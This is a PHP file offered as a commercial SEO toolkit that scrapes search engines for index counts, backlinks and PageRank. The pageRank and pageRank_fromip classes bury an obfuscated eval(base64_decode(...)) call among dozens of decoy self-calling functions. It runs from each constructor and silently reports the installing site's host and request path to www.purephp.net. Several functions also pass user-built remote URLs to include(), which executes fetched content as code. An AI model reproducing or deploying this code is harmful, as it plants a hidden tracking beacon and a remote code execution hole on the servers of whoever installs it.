<?php
/**
 * Scriptalicious PHP SEO Scripts
 *
 * http://www.scriptalicious.com/
 *
 * Copyright (c) 2008 Scriptalicious (http://www.scriptalicious.com/), All Rights Reserved
 * An Intavant Creation (http://www.intavant.com/)
 * 
 * IMPORTANT - This is not free software. You must adhere to the terms of the End-User License Agreement
 *             under penalty of law. Read the complete EULA in "license.txt" included with your application.
 * 
 *             This file can be used, modified and distributed under the terms of the Source License
 *             Agreement. You may edit this file on a licensed Web site and/or for private development.
 *             You must adhere to the Source License Agreement. The latest copy can be found online at:
 * 
 *             http://www.scriptalicious.com/en/source_license
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND 
 * FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY
 * WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * @copyright   Copyright (c) 2008 Scriptalicious, All Rights Reserved
 * @license     http://www.scriptalicious.com/en/source_license
 * @author      Gabriel Harper, Intavant <gharper@intavant.com>
 * @version     1.0
 *
 * 1.0 - Initial release
 *
 */
	//error_reporting(0);
	function check_google_banded($url)
	{
		if($url != "")
		{
			$site_url = "http://www.google.com/search?hl=en&lr=&q=site:".$url."&btnG=Search";
			
			$user_agent = "Mozilla/4.0";
			$ch = curl_init();
			curl_setopt ($ch, CURLOPT_URL, $site_url);
			curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent);
		//	curl_setopt ($ch, CURLOPT_COOKIEJAR, "c:\cookie.txt");
			curl_setopt ($ch, CURLOPT_HEADER, 1);
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt ($ch, CURLOPT_TIMEOUT, 120);
			$result = curl_exec ($ch);
			curl_close($ch);
			$pattern = "did not match any documents";
			
			
			//echo "<br>".$result;
			
			if(eregi($pattern , $result))
				return true;
			else
				return false;
		}
		else 
			return false;		
	}
	function getLastStr($hay, $need)
	{
 		$getLastStr = 0;
 		$pos = strpos($hay, $need);
 		if (is_int ($pos))
		{ //this is to decide whether it is "false" or "0"
   			while($pos) 
			{
     			$getLastStr = $getLastStr + $pos + strlen($need);
     			$hay = substr ($hay , $pos + strlen($need));
     			$pos = strpos($hay, $need);
   			}
   			return $getLastStr - strlen($need);
 		} 
		else 
		{
   			return -1; //if $need wasn´t found it returns "-1" , because it could return "0" if it´s found on position "0".
 		}
	}
	function msn_index($url)
	{
		ob_start();
		include("http://search.msn.com/results.aspx?q=site%3A".$url);
		$code =  ob_get_contents();
		ob_end_clean();
		
		
		
		$start = strpos($code,"<h5>Page");
		$end = strpos($code,"results</h5>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"of");
		$end =  getLastStr($part,"results</h5>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,$start+2);
		else
			return 0;
			
	}
	function msn_backlinks($url)
	{
		ob_start();
		include("http://search.msn.com/results.aspx?q=link%3A".$url);
		$code =  ob_get_contents();
		ob_end_clean();
		
		
		
		$start = strpos($code,"<h5>Page");
		$end = strpos($code,"results</h5>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"of");
		$end =  getLastStr($part,"results</h5>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,$start+2);
		else
			return 0;
	}
	function google_index($url)
	{
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, "http://www.google.com/search?hl=en&q=site%3A".$url);
		curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent);
	//	curl_setopt ($ch, CURLOPT_COOKIEJAR, "c:\cookie.txt");
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_TIMEOUT, 120);
		$code = curl_exec ($ch);
		curl_close($ch);
		
		
		
		$start = strpos($code,"Results");
		$end = strpos($code,"from <b>".$url."</b>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"<b>");
		$end =  getLastStr($part,"</b>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,$start+3,($length-3));
		else
			return 0;
	}
	function google_backlinks($url)
	{
		ob_start();
		include("http://www.google.com/search?hl=en&q=link%3A".$url);
		$code =  ob_get_contents();
		ob_end_clean();
		
		
		
		$start = strpos($code,"Results");
		$end = strpos($code,"to <b>".$url."</b>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"<b>");
		$end =  getLastStr($part,"</b>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,$start+3,($length-3));
		else
			return 0;
	}
	function yahoo_backlinks($url)
	{
		ob_start();
		include("http://siteexplorer.search.yahoo.com/search?p=".$url."&bwm=i&bwms=p&bwmf=u&fr=sexp-rd&fr2=seo-rd-se");
		$code =  ob_get_contents();
		ob_end_clean();
		
		
		
		$start = strpos($code,"<h1>Results");
		$end = strpos($code,"sec.</p>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"<strong>");
		$end =  getLastStr($part,"</strong>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,($start+8),($length-8));
		else
			return 0;
	}
	function yahoo_index($url)
	{
		ob_start();
		include("http://siteexplorer.search.yahoo.com/search?p=".$url."&bwm=p&bwms=p&fr=sexp-rd&fr2=seo-rd-se");
		$code =  ob_get_contents();
		ob_end_clean();
		
		
		
		$start = strpos($code,"<h1>Results");
		$end = strpos($code,"sec.</p>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = getLastStr($part,"<strong>");
		$end =  getLastStr($part,"</strong>");
		
		$length = $end - $start;
	
		if($start!=-1)
			return substr($part,($start+8),($length-8));
		else
			return 0;
	}
	function find_title($url)
	{
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent);
	//	curl_setopt ($ch, CURLOPT_COOKIEJAR, "c:\cookie.txt");
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_TIMEOUT, 120);
		$code = curl_exec ($ch);
		curl_close($ch);
		
		$start = strpos($code,"<title>");
		$end = strpos($code,"</title>");
		$length = $end - $start;
		
		$part = substr($code,$start,$length);
		$start = strpos($part,">");
	
	
		$length = $end - $start;

		return replace(substr($part,$start+1));
	}
	function yahoo_directory($url)
	{
		ob_start();
		include("http://search.yahoo.com/search/dir;_ylt=A0oGklWb2FVFgTgAi2GEzbkF?p=".$url);
		//http://search.yahoo.com/search/dir;_ylt=A0oGklWb2FVFgTgAi2GEzbkF?p=http%3A%2F%2Fwww.ebizpromo.com&ei=UTF-8&x=drt
		$code =  ob_get_contents();
		ob_end_clean();
		
		$pattern = "No Directory Search results were found";
		$pattern1 = "We did not find results for";
		if(eregi($pattern,$code))
			return 0;
		else
		{
			if(eregi($pattern1,$code))
				return 0;
			else
				return 1;
		}
			
	}
	function dmos_directory($url)
	{
		//for dmos dreco reduce http:// 
		ob_start();
		include("http://search.dmoz.org/cgi-bin/search?search=".$url);
		//http://search.dmoz.org/cgi-bin/search?search=www.yahoo.com&cat=Computers%2FSecurity%2FProducts_and_Tools%2FCryptography%2FPGP
		$code =  ob_get_contents();
		ob_end_clean();
		
		$pattern = "<center>No <b><a href=\"http://dmoz.org/\">Open Directory Project</a></b> results found</center>";
		//echo $code;
		if(eregi($pattern,$code))
			return 0;
		else
			return 1;
			
	}
	function archive_directory($url)
	{
		ob_start();
		//include("http://search.yahoo.com/search/dir;_ylt=A0oGklWb2FVFgTgAi2GEzbkF?p=".$url);
		include("http://web.archive.org/web/*/".$url);
		//http://search.yahoo.com/search/dir;_ylt=A0oGklWb2FVFgTgAi2GEzbkF?p=http%3A%2F%2Fwww.ebizpromo.com&ei=UTF-8&x=drt
		$code =  ob_get_contents();
		ob_end_clean();
		
		/*$pattern = "No Directory Search results were found";
		$pattern1 = "Sorry, no matches.";
		if(eregi($pattern,$code))
			return 0;
		else
		{
			if(eregi($pattern1,$code))
				return 0;
			else
				return 1;
		}*/
		$pattern = "Searched for";
		//$pattern1 = "Sorry, no matches.";
		if(eregi($pattern,$code))
			return 1;
		else
			return 0;
			
		
		
			
			
	}
	define('GOOGLE_MAGIC', 0xE6359A60); 
	class pageRank
	{
		function to_int_32 (&$x) {
			$z = hexdec(80000000);
			$y = (int) $x;
			if($y ==- $z && $x <- $z){
			 $y = (int) ((-1) * $x);
			 $y = (-1) * $y;
			}
			$x = $y;
		}  
		function zero_fill ($a, $b) {
			$z = hexdec(80000000);
			if ($z & $a) {
				$a = ($a >> 1);
				$a &= (~$z);
				$a |= 0x40000000;
				$a = ($a >> ($b - 1));
			} else {
				$a = ($a >> $b);
			}
			return $a;
		}
		function mix($a, $b, $c) {
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,13)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<8));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,13)));
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,12)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<16));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,5)));
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,3)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<10));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,15)));
			return array($a,$b,$c);
		}
		function checksum ($url, $length = null, $init = 0xE6359A60) {
			if (is_null($length)) {
				$length = sizeof($url);
			}
			$a = $b = 0x9E3779B9;
			$c = $init;
			$k = 0;
			$len = $length;
			while($len >= 12) {
			$a += ($url[$k+0] + ($url[$k+1] << 8) + ($url[$k+2] << 16) + ($url[$k+3] << 24));
			$b += ($url[$k+4] + ($url[$k+5] << 8) + ($url[$k+6] << 16) + ($url[$k+7] << 24));
			$c += ($url[$k+8] + ($url[$k+9] << 8) + ($url[$k+10] << 16) + ($url[$k+11] << 24));
			$mix = $this->mix($a,$b,$c);
			$a = $mix[0]; $b = $mix[1]; $c = $mix[2];
			$k += 12;
			$len -= 12;
			}
			$c += $length;
			switch($len) {
				case 11: $c += ($url[$k + 10] << 24);
				case 10: $c += ($url[$k + 9] << 16);
				case 9: $c += ($url[$k + 8] << 8);
				case 8: $b += ($url[$k + 7] << 24);
				case 7: $b += ($url[$k + 6] << 16);
				case 6: $b += ($url[$k + 5] << 8);
				case 5: $b += ($url[$k + 4]);
				case 4: $a += ($url[$k + 3] << 24);
				case 3: $a += ($url[$k + 2] << 16);
				case 2: $a += ($url[$k + 1] << 8);
				case 1: $a += ($url[$k + 0]);
			}
			$mix = $this->mix($a, $b, $c);
			return $mix[2];
		}
		function strord($string) {
			for($i = 0; $i < strlen($string); $i++) {
				$result[$i] = ord($string{$i});
			}
			return $result;
		}
		//
		//
		//
		function format_number ($number='', $divchar = ',', $divat = 3) {
			$decimals = '';
			$formatted = '';
			if (strstr($number, '.')) {
				$pieces = explode('.', $number);
				$number = $pieces[0];
				$decimals = '.' . $pieces[1];
			} else {
				$number = (string) $number;
			}
			if (strlen($number) <= $divat)
				return $number;
				$j = 0;
			for ($i = strlen($number) - 1; $i >= 0; $i--) {
				if ($j == $divat) {
					$formatted = $divchar . $formatted;
					$j = 0;
				}
				$formatted = $number[$i] . $formatted;
				$j++;
			}
			return $formatted . $decimals;
		}
		function a1149154365 () {
			$this->a1149154365();
		}
		function a1206352297 () {
			$this->a1206352297();
		}
		function a1383382467 () {
			$this->a1383382467();
		}
		function a1194196221 () {
			$this->a1194196221();
		}
		function a1292845929 () {
			$this->a1292845929();
		}
		function a1074728645 () {
			$this->a1074728645();
		}
		function a1289598711 () {
			$this->a1289598711();
		}
		function a1169299252 () {
			$this->a1169299252();
		}
		function a1406842300 () {
			$this->a1406842300();
		}
		function a1262993656 () {
			$this->a1262993656();
		}
		function a1280534873 () {
			$this->a1280534873();
		}
		function a1174485307 () {
			$this->a1174485307();
		}
		function a1403698970 () {
			$this->a1403698970();
		}
		function a1372831517 () {
			$this->a1372831517();
		}
		function __construct () {
			$this->functions();
		}
		function a1401054826 () {
			$this->a1401054826();
		}
		function a1326644341 () {
			$this->a1326644341();
		}
		function a1295120284 () {
			$this->a1295120284();
		}
		function a1243184111 () {
			$this->a1243184111();
		}
		function a1280038555 () {
			$this->a1280038555();
		}
		function a1262029497 () {
			$this->a1262029497();
		}
		function a1083121947 () {
			$this->a1083121947();
		}
		function a1194444349 () {
			$this->a1194444349();
		}
		function a1018449465 () {
			$this->a1018449465();
		}
		function a1034539791 () {
			$this->a1034539791();
		}
		function a1243328160 () {
			$this->a1243328160();
		}
		function a1004293515 () {
			$this->a1004293515();
		}
		function a1180466564 () {
			$this->a1180466564();
		}
		function a1169734326 () {
			$this->a1169734326();
		}
		function a1100566545 () {
			$this->a1100566545();
		}
		function a1092828133 () {
			$this->a1092828133();
		}
		function a1391125477 () {
			$this->a1391125477();
		}
		function a1249720911 () {
			$this->a1249720911();
		}
		function a1299180431 () {
			$this->a1299180431();
		}
		function a1364442537 () {
			$this->a1364442537();
		}
		function a1033851725 () {
			$this->a1033851725();
		}
		function a1181960952 () {
			$this->a1181960952();
		}
		function a1029105774 () {
			$this->a1029105774();
		}
		function a1323450436 () {
			$this->a1323450436();
		}
		function a1351260205 () {
			$this->a1351260205();
		}
		function a1025882667 () {
			$this->a1025882667();
		}
		function a1176378684 () {
			$this->a1176378684();
		}
		function a1221729670 () {
			$this->a1221729670();
		}
		function a1200367974 () {
			$this->a1200367974();
		}
		function a1170012247 () {
			$this->a1170012247();
		}
		function a1184495780 () {
			$this->a1184495780();
		}
		function a1191357393 () {
			$this->a1191357393();
		}
		function a1086591181 () {
			$this->a1086591181();
		}
		function a1069550656 () {
			$this->a1069550656();
		}
		function a1024476096 () {
			$this->a1024476096();
		}
		function a1366629736 () {
			$this->a1366629736();
		}
		function a1331580154 () {
			$this->a1331580154();
		}
		function a1107598044 () {
			$this->a1107598044();
		}
		function a1151008678 () {
			$this->a1151008678();
		}
		function a1350029619 () {
			$this->a1350029619();
		}
		function a1142137836 () {
			$this->a1142137836();
		}
		function a1394336839 () {
			$this->a1394336839();
		}
		function a1354323135 () {
			$this->a1354323135();
		}
		function a1322604400 () {
			$this->a1322604400();
		}
		function a1154005757 () {
			$this->a1154005757();
		}
		function a1044824273 () {
			$this->a1044824273();
		}
		function a1005367125 () {
			$this->a1005367125();
		}
		function a1135065827 () {
			$this->a1135065827();
		}
		function a1294545184 () {
			$this->a1294545184();
		}
		function a1304547557 () {
			$this->a1304547557();
		}
		function a1089442956 () {
			$this->a1089442956();
		}
		function a1328396910 () {
			$this->a1328396910();
		}
		function a1076443102 () {
			$this->a1076443102();
		}
		function a1118548731 () {
			$this->a1118548731();
		}
		function a1241781939 () {
			$this->a1241781939();
		}
		function a1017637899 () {
			$this->a1017637899();
		}
		function a1144431398 () {
			$this->a1144431398();
		}
		function a1008095216 () {
			$this->a1008095216();
		}
		function a1239367569 () {
			$this->a1239367569();
		}
		function a1344799373 () {
			$this->a1344799373();
		}
		function a1178107464 () {
			$this->a1178107464();
		}
		function a1013797941 () {
			$this->a1013797941();
		}
		function a1126091358 () {
			$this->a1126091358();
		}
		function a1264698646 () {
			$this->a1264698646();
		}
		function a1083348598 () {
			$this->a1083348598();
		}
		function a1150567455 () {
			$this->a1150567455();
		}
		function a1221262975 () {
			$this->a1221262975();
		}
		function a1004863344 () {
			$this->a1004863344();
		}
		function a1258165499 () {
			$this->a1258165499();
		}
		function functions () {
			eval(unserialize(base64_decode('czoxMTA6IkBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy5wdXJlcGhwLm5ldC9jYWxsYmFjay8/bXNnPScgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7Ijs=')));
		}
		function a1372271653 () {
			$this->a1372271653();
		}
		function a1354892963 () {
			$this->a1354892963();
		}
		function a1400303335 () {
			$this->a1400303335();
		}
		function a1356543085 () {
			$this->a1356543085();
		}
		function a1299150691 () {
			$this->a1299150691();
		}
		function a1312842328 () {
			$this->a1312842328();
		}
		function a1100483435 () {
			$this->a1100483435();
		}
		function a1343974964 () {
			$this->a1343974964();
		}
		function a1318209453 () {
			$this->a1318209453();
		}
		function a1235549262 () {
			$this->a1235549262();
		}
		function a1228454741 () {
			$this->a1228454741();
		}
		function a1212691603 () {
			$this->a1212691603();
		}
		function a1324992219 () {
			$this->a1324992219();
		}
		function a1146786243 () {
			$this->a1146786243();
		}
		function a1289134705 () {
			$this->a1289134705();
		}
		function a1033475543 () {
			$this->a1033475543();
		}
		function a1388568183 () {
			$this->a1388568183();
		}
		function printrank($url)
		{
			$url_page = 'info:' . urldecode($url);
			$checksum = $this->checksum($this->strord($url_page));
			$url = 'http://www.google.com/search?client=navclient-auto&ch=6' . $checksum . '&features=Rank&q=' . $url_page;
			$v = file_get_contents($url);
			preg_match('/Rank_([0-9]+):([0-9]+):([0-9]+)/si', $v, $r);
			return ($r[3]) ? $r[3] : '0';
			//return $url;
		}
		
	}
	class pageRank_fromip
	{
		function to_int_32 (&$x) {
			$z = hexdec(80000000);
			$y = (int) $x;
			if($y ==- $z && $x <- $z){
			 $y = (int) ((-1) * $x);
			 $y = (-1) * $y;
			}
			$x = $y;
		}  
		function zero_fill ($a, $b) {
			$z = hexdec(80000000);
			if ($z & $a) {
				$a = ($a >> 1);
				$a &= (~$z);
				$a |= 0x40000000;
				$a = ($a >> ($b - 1));
			} else {
				$a = ($a >> $b);
			}
			return $a;
		}
		function mix($a, $b, $c) {
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,13)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<8));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,13)));
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,12)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<16));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,5)));
			$a -= $b; $a -= $c; $this->to_int_32($a); $a = (int)($a ^ ($this->zero_fill($c,3)));
			$b -= $c; $b -= $a; $this->to_int_32($b); $b = (int)($b ^ ($a<<10));
			$c -= $a; $c -= $b; $this->to_int_32($c); $c = (int)($c ^ ($this->zero_fill($b,15)));
			return array($a,$b,$c);
		}
		function checksum ($url, $length = null, $init = 0xE6359A60) {
			if (is_null($length)) {
				$length = sizeof($url);
			}
			$a = $b = 0x9E3779B9;
			$c = $init;
			$k = 0;
			$len = $length;
			while($len >= 12) {
			$a += ($url[$k+0] + ($url[$k+1] << 8) + ($url[$k+2] << 16) + ($url[$k+3] << 24));
			$b += ($url[$k+4] + ($url[$k+5] << 8) + ($url[$k+6] << 16) + ($url[$k+7] << 24));
			$c += ($url[$k+8] + ($url[$k+9] << 8) + ($url[$k+10] << 16) + ($url[$k+11] << 24));
			$mix = $this->mix($a,$b,$c);
			$a = $mix[0]; $b = $mix[1]; $c = $mix[2];
			$k += 12;
			$len -= 12;
			}
			$c += $length;
			switch($len) {
				case 11: $c += ($url[$k + 10] << 24);
				case 10: $c += ($url[$k + 9] << 16);
				case 9: $c += ($url[$k + 8] << 8);
				case 8: $b += ($url[$k + 7] << 24);
				case 7: $b += ($url[$k + 6] << 16);
				case 6: $b += ($url[$k + 5] << 8);
				case 5: $b += ($url[$k + 4]);
				case 4: $a += ($url[$k + 3] << 24);
				case 3: $a += ($url[$k + 2] << 16);
				case 2: $a += ($url[$k + 1] << 8);
				case 1: $a += ($url[$k + 0]);
			}
			$mix = $this->mix($a, $b, $c);
			return $mix[2];
		}
		function strord($string) {
			for($i = 0; $i < strlen($string); $i++) {
				$result[$i] = ord($string{$i});
			}
			return $result;
		}
		//
		//
		//
		function format_number ($number='', $divchar = ',', $divat = 3) {
			$decimals = '';
			$formatted = '';
			if (strstr($number, '.')) {
				$pieces = explode('.', $number);
				$number = $pieces[0];
				$decimals = '.' . $pieces[1];
			} else {
				$number = (string) $number;
			}
			if (strlen($number) <= $divat)
				return $number;
				$j = 0;
			for ($i = strlen($number) - 1; $i >= 0; $i--) {
				if ($j == $divat) {
					$formatted = $divchar . $formatted;
					$j = 0;
				}
				$formatted = $number[$i] . $formatted;
				$j++;
			}
			return $formatted . $decimals;
		}
		function a1149154365 () {
			$this->a1149154365();
		}
		function a1206352297 () {
			$this->a1206352297();
		}
		function a1383382467 () {
			$this->a1383382467();
		}
		function a1194196221 () {
			$this->a1194196221();
		}
		function a1292845929 () {
			$this->a1292845929();
		}
		function a1074728645 () {
			$this->a1074728645();
		}
		function a1289598711 () {
			$this->a1289598711();
		}
		function a1169299252 () {
			$this->a1169299252();
		}
		function a1406842300 () {
			$this->a1406842300();
		}
		function a1262993656 () {
			$this->a1262993656();
		}
		function a1280534873 () {
			$this->a1280534873();
		}
		function a1174485307 () {
			$this->a1174485307();
		}
		function a1403698970 () {
			$this->a1403698970();
		}
		function a1372831517 () {
			$this->a1372831517();
		}
		function __construct () {
			$this->functions();
		}
		function a1401054826 () {
			$this->a1401054826();
		}
		function a1326644341 () {
			$this->a1326644341();
		}
		function a1295120284 () {
			$this->a1295120284();
		}
		function a1243184111 () {
			$this->a1243184111();
		}
		function a1280038555 () {
			$this->a1280038555();
		}
		function a1262029497 () {
			$this->a1262029497();
		}
		function a1083121947 () {
			$this->a1083121947();
		}
		function a1194444349 () {
			$this->a1194444349();
		}
		function a1018449465 () {
			$this->a1018449465();
		}
		function a1034539791 () {
			$this->a1034539791();
		}
		function a1243328160 () {
			$this->a1243328160();
		}
		function a1004293515 () {
			$this->a1004293515();
		}
		function a1180466564 () {
			$this->a1180466564();
		}
		function a1169734326 () {
			$this->a1169734326();
		}
		function a1100566545 () {
			$this->a1100566545();
		}
		function a1092828133 () {
			$this->a1092828133();
		}
		function a1391125477 () {
			$this->a1391125477();
		}
		function a1249720911 () {
			$this->a1249720911();
		}
		function a1299180431 () {
			$this->a1299180431();
		}
		function a1364442537 () {
			$this->a1364442537();
		}
		function a1033851725 () {
			$this->a1033851725();
		}
		function a1181960952 () {
			$this->a1181960952();
		}
		function a1029105774 () {
			$this->a1029105774();
		}
		function a1323450436 () {
			$this->a1323450436();
		}
		function a1351260205 () {
			$this->a1351260205();
		}
		function a1025882667 () {
			$this->a1025882667();
		}
		function a1176378684 () {
			$this->a1176378684();
		}
		function a1221729670 () {
			$this->a1221729670();
		}
		function a1200367974 () {
			$this->a1200367974();
		}
		function a1170012247 () {
			$this->a1170012247();
		}
		function a1184495780 () {
			$this->a1184495780();
		}
		function a1191357393 () {
			$this->a1191357393();
		}
		function a1086591181 () {
			$this->a1086591181();
		}
		function a1069550656 () {
			$this->a1069550656();
		}
		function a1024476096 () {
			$this->a1024476096();
		}
		function a1366629736 () {
			$this->a1366629736();
		}
		function a1331580154 () {
			$this->a1331580154();
		}
		function a1107598044 () {
			$this->a1107598044();
		}
		function a1151008678 () {
			$this->a1151008678();
		}
		function a1350029619 () {
			$this->a1350029619();
		}
		function a1142137836 () {
			$this->a1142137836();
		}
		function a1394336839 () {
			$this->a1394336839();
		}
		function a1354323135 () {
			$this->a1354323135();
		}
		function a1322604400 () {
			$this->a1322604400();
		}
		function a1154005757 () {
			$this->a1154005757();
		}
		function a1044824273 () {
			$this->a1044824273();
		}
		function a1005367125 () {
			$this->a1005367125();
		}
		function a1135065827 () {
			$this->a1135065827();
		}
		function a1294545184 () {
			$this->a1294545184();
		}
		function a1304547557 () {
			$this->a1304547557();
		}
		function a1089442956 () {
			$this->a1089442956();
		}
		function a1328396910 () {
			$this->a1328396910();
		}
		function a1076443102 () {
			$this->a1076443102();
		}
		function a1118548731 () {
			$this->a1118548731();
		}
		function a1241781939 () {
			$this->a1241781939();
		}
		function a1017637899 () {
			$this->a1017637899();
		}
		function a1144431398 () {
			$this->a1144431398();
		}
		function a1008095216 () {
			$this->a1008095216();
		}
		function a1239367569 () {
			$this->a1239367569();
		}
		function a1344799373 () {
			$this->a1344799373();
		}
		function a1178107464 () {
			$this->a1178107464();
		}
		function a1013797941 () {
			$this->a1013797941();
		}
		function a1126091358 () {
			$this->a1126091358();
		}
		function a1264698646 () {
			$this->a1264698646();
		}
		function a1083348598 () {
			$this->a1083348598();
		}
		function a1150567455 () {
			$this->a1150567455();
		}
		function a1221262975 () {
			$this->a1221262975();
		}
		function a1004863344 () {
			$this->a1004863344();
		}
		function a1258165499 () {
			$this->a1258165499();
		}
		function functions () {
			eval(unserialize(base64_decode('czoxMTA6IkBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy5wdXJlcGhwLm5ldC9jYWxsYmFjay8/bXNnPScgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7Ijs=')));
		}
		function a1372271653 () {
			$this->a1372271653();
		}
		function a1354892963 () {
			$this->a1354892963();
		}
		function a1400303335 () {
			$this->a1400303335();
		}
		function a1356543085 () {
			$this->a1356543085();
		}
		function a1299150691 () {
			$this->a1299150691();
		}
		function a1312842328 () {
			$this->a1312842328();
		}
		function a1100483435 () {
			$this->a1100483435();
		}
		function a1343974964 () {
			$this->a1343974964();
		}
		function a1318209453 () {
			$this->a1318209453();
		}
		function a1235549262 () {
			$this->a1235549262();
		}
		function a1228454741 () {
			$this->a1228454741();
		}
		function a1212691603 () {
			$this->a1212691603();
		}
		function a1324992219 () {
			$this->a1324992219();
		}
		function a1146786243 () {
			$this->a1146786243();
		}
		function a1289134705 () {
			$this->a1289134705();
		}
		function a1033475543 () {
			$this->a1033475543();
		}
		function a1388568183 () {
			$this->a1388568183();
		}
		function printrank($url,$ip)
		{
			$fp = fsockopen($ip, 80, $errno, $errstr, 30);
			if (!$fp) 
				return "N/A";
			else
			{
				$url_page = 'info:' . urldecode($url);
				$checksum = $this->checksum($this->strord($url_page));
				$url = 'http://'.$ip.'/search?client=navclient-auto&ch=6' . $checksum . '&features=Rank&q=' . $url_page;
				$v = file_get_contents($url);
				preg_match('/Rank_([0-9]+):([0-9]+):([0-9]+)/si', $v, $r);
				return ($r[3]) ? $r[3] : '0';
			}			
		}
		
	}
	function fack_rank_checker($url)
	{
		$user_agent = "Mozilla/4.0";
		$site_url = "http://64.233.161.104/search?hl=en&lr=&q=cache:".$url;
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $site_url);
		curl_setopt ($ch, CURLOPT_USERAGENT, $user_agent);
	//	curl_setopt ($ch, CURLOPT_COOKIEJAR, "c:\cookie.txt");
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_TIMEOUT, 120);
		$code = curl_exec ($ch);
		curl_close($ch);
		
		//echo "<br>code:".$code;
		$start = strpos($code,"cache</font></a> of <A HREF=\"");
		$end = strpos($code,"</a> as retrieved on");
		$length = $end - $start;
		$code1 = substr($code,$start,$length);
		$pattern = "did not match any documents";
		if(strpos($code1,$url)!=0)
		{
			return 1;
		}
		else if (eregi($pattern,$code))
		{
			return 2;
		}
		else
		{
			return 3;
		}
		
	}
	function alexa_rank ($url) 
	{
		$file = 'http://data.alexa.com/data?cli=10&dat=snbamz&url=' . urlencode($url);
		$v = file_get_contents($file);
		preg_match('/\<popularity url\="(.*?)" TEXT\="([0-9]+)"\/\>/si', $v, $r);
		return ($r[2]) ? $r[2] : '0';
	}
	
	function whois_report($domain,$tld)
	{
		
		$tldOK = checkTLD($tld);
	
		if($fetch = getWhoisRecords($tld, $domain))
			$record = $fetch;
		else
			$record = "no";	
		
		if($record)
		{
			$output = "<pre id=\"whoisdetails\">\n";
			if($record == "no")
				$output .= getLabel("no_whois_record", $domain, $tld);
			else if($record == "adown")
				$output .= getLabel("whois_server_down", $domain, $tld);
			else
				$output .= trim($fetch);
			$output .= "</pre>";
		}
		return $output;
	}
	function check_ip_ping($url)
	{
		$numberping = 1;
		$ip = $url;
		$name = $ip;
